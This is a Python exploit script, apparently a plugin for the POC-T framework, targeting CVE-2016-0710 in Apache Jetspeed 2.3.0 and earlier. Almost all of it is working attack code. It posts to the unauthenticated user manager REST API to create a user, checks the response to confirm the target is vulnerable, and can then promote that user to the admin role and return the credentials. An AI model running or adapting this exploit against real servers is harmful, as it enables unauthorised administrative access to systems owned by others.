#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
Apache Jetspeed 用户管理 REST API 未授权访问添加用户 (CVE-2016-0710)

version <= 2.3.0
"""

import requests
from plugin.urlparser import get_domain
from plugin.util import randomString
from plugin.useragent import firefox

ENABLE_EXP = False


def poc(url):
    if '://' not in url:
        if ':443' in url:
            url = 'https://' + url
        else:
            url = 'http://' + url
    url = get_domain(url).rstrip('/')

    user = randomString(6)
    password = randomString(6)

    url1 = url + '/jetspeed/services/usermanager/users/?_type=json'
    data1 = {
        'name': user,
        'password': password,
        'password_confirm': password,
        'user_name_given': 'foo',
        'user_name_family': 'bar',
        'user_email': 'test@test.net',
        'newrule': ''
    }
    try:
        requests.post(url1, data=data1, headers={'User-Agent': firefox}, timeout=10, verify=False)
        c = requests.post(url1, data=data1, headers={'User-Agent': firefox}, timeout=10, verify=False).content
        # response: org.apache.jetspeed.security.SecurityException.PRINCIPAL_ALREADY_EXISTS
        if 'PRINCIPAL_ALREADY_EXISTS' in c:
            if not ENABLE_EXP:
                return True
        else:
            return False
    except Exception, e:
        if not ENABLE_EXP:
            return False

    url2 = url + '/jetspeed/services/usermanager/users/' + user + '/?_type=json'
    data2 = {
        'name': '',
        'password': '',
        'password_confirm': '',
        'user_name_given': '',
        'user_name_family': '',
        'user_email': '',
        'user_enabled': '',
        'roles': 'admin',
        'rule': ''
    }
    try:
        r = requests.post(url2, data=data2, headers={'User-Agent': firefox}, timeout=10, verify=False)
        if len(r.content) < 10 and 'true' in r.content:
            return '%s |user:%s |pass:%s' % (url, user, password)
    except Exception:
        return False
    return False
